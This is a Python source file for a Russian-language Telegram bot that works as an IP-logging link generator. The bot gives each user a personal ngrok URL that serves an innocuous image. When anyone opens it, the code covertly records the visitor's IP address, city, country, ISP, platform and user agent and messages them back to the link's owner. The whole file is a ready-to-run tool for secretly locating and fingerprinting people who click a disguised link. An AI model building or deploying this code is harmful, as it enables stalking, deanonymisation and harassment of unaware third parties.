import json
import os
import datetime
import asyncio
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from quart import Quart, request, send_file
from pyngrok import ngrok
import threading
from cfg import *


bot = Bot(token=TOKEN)
dp = Dispatcher(bot)


app = Quart(__name__)

async def get_ip_info(ip):
    try:
        response = await asyncio.get_event_loop().run_in_executor(
            None, 
            lambda: requests.get(f"http://ip-api.com/json/{ip}")
        )
        if response.status_code == 200:
            data = response.json()
            return (
                f"📍 Город: {data.get('city', 'Неизвестно')}\n"
                f"🌍 Страна: {data.get('country', 'Неизвестно')}\n"
                f"🏢 Провайдер: {data.get('isp', 'Неизвестно')}"
            )
    except:
        pass
    return ""

@app.route('/')
async def serve_image():
    user_id = request.args.get('user_id')
    if user_id:

        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent')
        request_url = str(request.url)
        platform = request.headers.get('Sec-Ch-Ua-Platform', 'Неизвестно')
        mobile = request.headers.get('Sec-Ch-Ua-Mobile', 'Неизвестно')
        
        data = load_data()
        if user_id in data:
            ip_info = await get_ip_info(ip_address)
            message = (
                f"🔍 Новый просмотр изображения!\n\n"
                f"📱 User ID: {user_id}\n"
                f"🌐 IP адрес: {ip_address}\n"
                f"{ip_info}\n"
                f"💻 Платформа: {platform}\n"
                f"📱 Мобильное устройство: {'Да' if mobile == '?1' else 'Нет'}\n"
                f"🔗 URL запроса: `{request_url}`\n"
                f"📊 User-Agent: {user_agent}\n"
                f"⏰ Время: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            
            data[user_id].update({
                'last_ip': ip_address,
                'last_url': request_url,
                'last_user_agent': user_agent,
                'platform': platform,
                'is_mobile': mobile == '?1',
                'last_visit': str(datetime.datetime.now())
            })
            save_data(data)
            
            await bot.send_message(chat_id=user_id, text=message,parse_mode='markdown')
    
    return await send_file('i.png', mimetype='image/png')

async def run_quart():
    await app.run_task(host='0.0.0.0', port=5000)


def load_data():
    if not os.path.exists('data'):
        os.makedirs('data')
    if os.path.exists('data/urls.json'):
        try:
            with open('data/urls.json', 'r') as file:
                return json.load(file)
        except json.JSONDecodeError:
            return {}
    return {}


def save_data(data):
    with open('data/urls.json', 'w') as file:
        json.dump(data, file, indent=4)


ngrok_tunnel = None

async def on_startup(dp):
    global ngrok_tunnel
    try:

        os.system("pkill -f ngrok")
        await asyncio.sleep(2)  
        

        ngrok.set_auth_token(tokenNgrok)
        ngrok_tunnel = ngrok.connect(5000)
        print(f"🌐 Создан туннель: {ngrok_tunnel.public_url}")
        

        asyncio.create_task(run_quart())
        asyncio.create_task(command_handler())
        print("🚀 Бот запущен! Введите 'stop' для остановки.")
    except Exception as e:
        print(f"❌ Ошибка при запуске: {str(e)}")
        os._exit(1)

@dp.message_handler(commands=['start', 'help'])
async def send_welcome(message: types.Message):
    global ngrok_tunnel
    user_id = str(message.from_user.id)
    data = load_data()
    
    try:
        if user_id in data:
            public_url = data[user_id]['url']
        else:
            public_url = f"{ngrok_tunnel.public_url}?user_id={user_id}"
            data[user_id] = {
                'url': public_url,
                'created_at': str(datetime.datetime.now())
            }
            save_data(data)
        
        await message.reply(
            f"👋 Привет!\n\n"
            f"🔗 Вот ваша ссылка:\n`{public_url}`\n\n"
            f"🔄 Для обновления ссылки используйте /regen",
            parse_mode='markdown'
        )
    except Exception as e:
        await message.reply(f"❌ Произошла ошибка: {str(e)}")

@dp.message_handler(commands=['regen'])
async def regenerate_link(message: types.Message):
    global ngrok_tunnel
    user_id = str(message.from_user.id)
    data = load_data()
    
    try:

        public_url = f"{ngrok_tunnel.public_url}?user_id={user_id}"
        data[user_id] = {
            'url': public_url,
            'created_at': str(datetime.datetime.now())
        }
        save_data(data)
        
        await message.reply(
            f"✨ Ссылка успешно обновлена!\n\n"
            f"🔗 Новая ссылка:\n`{public_url}`",
            parse_mode='markdown'
        )
    except Exception as e:
        await message.reply(f"❌ Произошла ошибка: {str(e)}")
def stop_bot():
    global running, ngrok_tunnel
    print("\n🛑 Останавливаем бота...")
    if ngrok_tunnel:
        try:
            ngrok.disconnect(ngrok_tunnel.public_url)
        except:
            pass

    os.system("pkill -f ngrok")
    os._exit(0)

async def command_handler():
    global running
    while running:
        command = await asyncio.get_event_loop().run_in_executor(None, input)
        if command.lower() == 'stop':
            stop_bot()
        await asyncio.sleep(0.1)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)